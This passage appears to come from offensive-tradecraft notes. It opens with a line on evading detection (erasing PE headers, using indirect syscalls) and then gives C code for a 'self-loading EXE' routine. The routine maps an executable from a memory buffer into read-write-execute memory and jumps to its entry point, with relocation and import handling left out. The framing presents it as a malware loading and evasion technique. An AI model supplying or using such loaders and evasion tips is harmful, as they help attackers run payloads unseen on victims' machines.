> Mitigation: Erase PE headers, use indirect syscalls

### Self-Loading EXE Pattern
```c
// Load and execute a PE (EXE) entirely from a memory buffer
// Unlike DLL reflective loading, this handles EXE-specific concerns:
// - No DllMain, uses AddressOfEntryPoint directly
// - May need to initialize CRT

void RunPEFromMemory(PBYTE pRawExe) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pRawExe;
    PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(pRawExe + pDos->e_lfanew);

    // Allocate at preferred base
    PBYTE pBase = (PBYTE)VirtualAlloc(
        (LPVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pBase)
        pBase = (PBYTE)VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy headers and sections
    memcpy(pBase, pRawExe, pNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData)
            memcpy(pBase + pSec[i].VirtualAddress,
                   pRawExe + pSec[i].PointerToRawData,
                   pSec[i].SizeOfRawData);
    }

    // Relocations + Imports (same as ReflectiveLoad)
    // ...

    // Jump to entry point
    typedef int(*tEntry)(void);
    tEntry pEntry = (tEntry)(pBase + pNt->OptionalHeader.AddressOfEntryPoint);
    pEntry();
}
```
